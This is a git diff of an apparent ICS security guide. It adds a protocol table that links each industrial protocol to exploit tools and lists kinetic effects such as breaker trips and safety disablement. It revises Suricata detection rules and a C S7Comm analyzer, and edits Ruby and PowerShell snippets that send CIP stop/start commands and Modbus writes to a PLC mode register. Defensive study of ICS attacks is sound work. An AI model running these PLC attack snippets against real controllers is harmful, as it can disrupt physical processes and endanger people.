@@ -744,17 +744,17 @@ This comment improves organic discovery + GitHub code search ranking + domain re
 
 ### 2. ICS PROTOCOL DEEP DIVE - EXPANDED MATRIX WITH C2 & KINETIC RISK
 
-| Protocol | Port(s) | Use | Auth | Encryption | Primary Kinetic Effect | C2/Exfil Potential |
-|----------|---------|-----|------|------------|----------------------|-------------------|
-| Modbus TCP | 502 | Read/write coils/registers | ❌ | ❌ | **Direct actuation**, override setpoints | **Low** (easy to fingerprint) |
-| DNP3 | 20000 | Telemetry/control | Partial | Optional | **False feedback**, unsolicited spoofing | **Medium** |
-| OPC UA | 4840 | Data broker | ✔️ | Optional | **HMI spoofing**, historian poisoning | **High** (normal channel blending) |
-| PROFINET | 34962/34964 | Real-time fieldbus | ❌ | ❌ | **Network DoS**, device identity spoof | **Low** |
-| CIP / EtherNet/IP | 44818/2222 | Rockwell interface | ❌ | ❌ | **Safety disablement, tag overwrite** | **Medium** (via rogue tags) |
-| S7Comm | 102 | Siemens control | ❌ | ❌ | **PLC halt/start, logic download** | **High** (block-level control) |
-| IEC-104 | 2404 | Euro grid SCADA | ❌ | ❌ | **Breaker trip, status fraud** | **Medium** |
-| BACnet | 47808 | HVAC/Building | ❌ | ❌ | **Environmental sabotage**, fire suppression | **Low** |
-| ICCP (Fox) | Varies | Grid-to-grid link | Varies | Varies | **Inter-grid sabotage** | **High** (trusted peer channel) |
+| Protocol | Port(s) | Use | Auth | Encryption | Primary Kinetic Effect | C2/Exfil Potential | Implementation |
+|----------|---------|-----|------|------------|----------------------|-------------------|----------------|
+| Modbus TCP | 502 | Read/write coils/registers | ❌ | ❌ | **Direct actuation**, override setpoints | **Low** (easy to fingerprint) | tools/modbus-stealth-toolkit/modbus_stealth_attack.py |
+| DNP3 | 20000 | Telemetry/control | Partial | Optional | **False feedback**, unsolicited spoofing | **Medium** | Detection: configs/suricata_rules/ics_malware_detection.rules:400003-400005 |
+| OPC UA | 4840 | Data broker | ✔️ | Optional | **HMI spoofing**, historian poisoning | **High** (normal channel blending) | tools/opcua_security_framework/opcua_exploit.py |
+| PROFINET | 34962/34964 | Real-time fieldbus | ❌ | ❌ | **Network DoS**, device identity spoof | **Low** | tools/profinet_exploitation/profinet_exploit.py |
+| CIP / EtherNet/IP | 44818/2222 | Rockwell interface | ❌ | ❌ | **Safety disablement, tag overwrite** | **Medium** (via rogue tags) | tools/cip_security_assessment/cip_exploiter.py |
+| S7Comm | 102 | Siemens control | ❌ | ❌ | **PLC halt/start, logic download** | **High** (block-level control) | tools/s7comm_security_framework/s7comm_exploit.py |
+| IEC-104 | 2404 | Euro grid SCADA | ❌ | ❌ | **Breaker trip, status fraud** | **Medium** | Not implemented |
+| BACnet | 47808 | HVAC/Building | ❌ | ❌ | **Environmental sabotage**, fire suppression | **Low** | tools/bacnet_security_assessment/bacnet_assessment.py |
+| ICCP (Fox) | Varies | Grid-to-grid link | Varies | Varies | **Inter-grid sabotage** | **High** (trusted peer channel) | Not implemented |
 
 ### 3. ICS RECONNAISSANCE - PASSIVE AND ACTIVE PLAYBOOKS
 
@@ -1090,7 +1090,14 @@ Zeek script for Modbus scan detection monitors for multiple header requests
 
 **Defensive Control Validation:**
 Suricata rule for Modbus write detection:
-alert tcp any any -> any 502 (msg:"MODBUS Write Operation Detected"; content:"|00 00 00 00 00|"; depth:5; byte_test:1,>,4,7; sid:400001; rev:1; classtype:protocol-command-decode;)
+```suricata
+# Modbus TCP Write Detection
+# Validates against ModbusPacket structure: tools/modbus-stealth-toolkit/modbus_stealth_attack.py:129-147
+# MBAP Header: Transaction ID (2) + Protocol ID (2, must be 0x0000) + Length (2) + Unit ID (1)
+# Function codes: 0x05 (Write Single Coil), 0x06 (Write Single Register), 
+#                0x0F (Write Multiple Coils), 0x10 (Write Multiple Registers)
+alert tcp any any -> any 502 (msg:"MODBUS Write Operation Detected"; content:"|00 00|"; offset:2; depth:2; byte_test:1,>,4,7; sid:400001; rev:2; classtype:protocol-command-decode; reference:url,tools/modbus-stealth-toolkit/modbus_stealth_attack.py;)
+```
 
 **Compensating Controls:**
 - Out-of-band sensor validation comparing Modbus register values to physical measurements
@@ -1643,9 +1650,16 @@ alert tcp any any -> any 445 (msg:"Stuxnet LNK Exploit Attempt"; flow:establishe
 **Advanced Detection Signatures:**
 
 **Suricata Rules for Stuxnet Detection:**
+```suricata
+# S7Comm Centrifuge Manipulation Detection
+# Validates against S7Packet structure: tools/s7comm_security_framework/s7comm_exploit.py:94-140
+# Protocol ID 0x32, Message Type 0x01, Reserved 0x0000
 alert tcp any any -> any 102 (msg:"STUXNET_S7COMM_CENTRIFUGE_MANIPULATION"; flow:established,to_server; content:"|32 01 00 00|"; depth:4; content:"|00 00 2F 00|"; distance:4; within:8; content:"|47 00|"; distance:12; within:4; byte_test:2,>,1400,0,relative; byte_test:2,<,800,0,relative; threshold:type threshold, track by_src, count 3, seconds 60; sid:500001; rev:2;)
 
+# S7Comm Timing Anomaly Detection
+# Detects rapid S7Comm write operations (Protocol ID 0x32, Message Type 0x01)
 alert tcp any any -> any 102 (msg:"STUXNET_S7COMM_TIMING_ANOMALY"; flow:established,to_server; content:"|32 01|"; depth:2; dsize:>100; flowbits:set,s7comm_write; flowbits:noalert; sameip; window:30,0; threshold:type both, track by_src, count 6, seconds 120; sid:500002; rev:1;)
+```
 
 **1.2 TRITON PCAP EMULATION: SAFETY SYSTEM COMPROMISE**
 
@@ -4375,40 +4389,65 @@ pub fn track_critical_write(&mut self, src_ip: IpAddr, db_number: u16) -> u32 {
 """;
 
 # C integration for low-level packet analysis
+# Reference: tools/s7comm_security_framework/s7comm_exploit.py:94-140
 const C_PACKET_ANALYZER = """
 // Low-level S7Comm Packet Analysis - C Implementation
+// Complete packet structure with TPKT, COTP, and S7 headers
+// Validated against tools/s7comm_security_framework/s7comm_exploit.py:94-140
 #include <stdint.h>
 #include <stdio.h>
 
 typedef struct {
-uint8_t protocol_id;
-uint8_t message_type;
-uint16_t reserved;
-uint16_t pdu_reference;
-uint16_t param_length;
-uint16_t data_length;
-uint8_t function_code;
-} S7Comm_Header;
+    // TPKT Header (4 bytes)
+    uint8_t tpkt_version;      // Always 3
+    uint8_t tpkt_reserved;     // Always 0
+    uint16_t tpkt_length;      // Total packet length
+    
+    // COTP Header (3 bytes)
+    uint8_t cotp_length;       // COTP header length
+    uint8_t cotp_pdu_type;     // PDU type
+    uint8_t cotp_tpdu_number;  // TPDU number
+    
+    // S7Comm Header (10 bytes)
+    uint8_t protocol_id;       // 0x32 for S7Comm, 0x72 for S7CommPlus
+    uint8_t message_type;      // Job request, Ack data, etc.
+    uint16_t reserved;         // Always 0x0000
+    uint16_t pdu_reference;    // Request/response matching
+    uint16_t param_length;     // Parameter field length
+    uint16_t data_length;      // Data field length
+} S7Comm_Packet_Header;
 
 int analyze_s7comm_packet(const unsigned char* packet, size_t length) {
-if (length < sizeof(S7Comm_Header)) {
-    return -1; // Packet too short
-}
+    if (length < sizeof(S7Comm_Packet_Header)) {
+        return -1; // Packet too short (minimum 17 bytes)
+    }
 
-S7Comm_Header* header = (S7Comm_Header*)packet;
+    S7Comm_Packet_Header* header = (S7Comm_Packet_Header*)packet;
+    
+    // Validate TPKT version
+    if (header->tpkt_version != 3) {
+        return -2; // Invalid TPKT version
+    }
+    
+    // Validate protocol ID
+    if (header->protocol_id != 0x32 && header->protocol_id != 0x72) {
+        return -3; // Invalid protocol ID
+    }
+    
+    // Extract function code from parameters (first byte after header)
+    if (length > sizeof(S7Comm_Packet_Header)) {
+        uint8_t function_code = packet[sizeof(S7Comm_Packet_Header)];
+        
+        if (function_code == 0x05) { // Write variable (WRITE_VAR)
+            return 1; // Critical write operation detected
+        }
+        
+        if (function_code == 0x28 || function_code == 0x29) { // PLC control/stop
+            return 2; // Control function detected
+        }
+    }
 
-// Check for critical function codes
-if (header->function_code == 0x05) { // Write variable
-    // Critical write operation detected
-    return 1;
-}
-
-if (header->function_code == 0x28) { // PLC control
-    // Control function detected
-    return 2;
-}
-
-return 0; // Normal packet
+    return 0; // Normal packet
 }
 """;
 
@@ -10643,20 +10682,25 @@ class ControllerModeExploiter:
         """
         Exploit Rockwell CIP protocol for controller mode manipulation.
         Uses Common Industrial Protocol vulnerabilities to change controller state.
+        
+        See implementation: tools/cip_security_assessment/cip_exploiter.py:44-73
         """
         print("[+] Exploiting Rockwell CIP protocol...")
         techniques = []
         
         # Ruby integration for CIP protocol fuzzing
+        # Validated against CIPServiceCode: tools/cip_security_assessment/cip_exploiter.py:44-73
         ruby_cip_exploit = """
         # Rockwell CIP Mode Exploitation - Ruby Implementation
         require 'socket'
         
         class CIPExploit
+          # CIP Common Service Codes (per CIP Vol 1, Chapter 5)
           CIP_MODE_SERVICES = {
-            stop: 0x4E,
-            run: 0x4D,
-            program: 0x4F
+            stop: 0x07,         # STOP service
+            start: 0x06,        # START service
+            read_tag: 0x4C,     # READ_TAG service
+            write_tag: 0x4D     # WRITE_TAG service
           }
           
           def initialize(target_ip, port=44818)
@@ -10726,6 +10770,8 @@ class ControllerModeExploiter:
         """
         Exploit Schneider Electric controllers via Modbus protocol.
         Uses Modbus function code manipulation for mode control.
+        
+        See implementation: tools/modbus-stealth-toolkit/modbus_stealth_attack.py:129-147
         """
         print("[+] Exploiting Schneider Modbus protocol...")
         techniques = []
@@ -10737,17 +10783,19 @@ class ControllerModeExploiter:
             param([string]$TargetIP)
             
             # Modbus TCP mode manipulation for Schneider PLCs
+            # Packet structure validated against ModbusPacket.to_tcp_bytes()
+            # Reference: tools/modbus-stealth-toolkit/modbus_stealth_attack.py:138-147
             $modbusPort = 502
             $client = New-Object System.Net.Sockets.TcpClient($TargetIP, $modbusPort)
             $stream = $client.GetStream()
             
-            # Craft malicious Modbus packet for mode change
+            # Craft Modbus TCP packet (MBAP header + PDU)
             $modbusPacket = @(
-                0x00, 0x01,  # Transaction ID
-                0x00, 0x00,  # Protocol ID
-                0x00, 0x06,  # Length
-                0x01,        # Unit ID
-                0x10,        # Function Code (Write Multiple Registers)
+                0x00, 0x01,  # Transaction ID (2 bytes)
+                0x00, 0x00,  # Protocol ID (2 bytes, must be 0 for Modbus)
+                0x00, 0x06,  # Length (2 bytes, PDU length + 1)
+                0x01,        # Unit ID (1 byte)
+                0x10,        # Function Code 0x10 (Write Multiple Registers)
                 0x00, 0x64,  # Starting Address (Mode control register)
                 0x00, 0x01,  # Number of registers
                 0x02,        # Byte count
